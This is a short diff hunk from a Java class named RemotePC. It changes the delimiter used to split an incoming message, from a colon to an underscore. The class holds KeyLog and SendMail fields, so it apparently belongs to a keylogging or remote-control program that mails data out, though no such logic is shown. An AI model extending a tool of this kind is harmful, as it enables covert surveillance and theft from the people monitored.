@@ -92,7 +92,7 @@ public class RemotePC {
   SendMail send;
 
   public RemotePC(String message, KeyLog keylog, SendMail send) {
-    this.message = message.split(":");
+    this.message = message.split("_");
     this.keylog = keylog;
     this.send = send;
   }
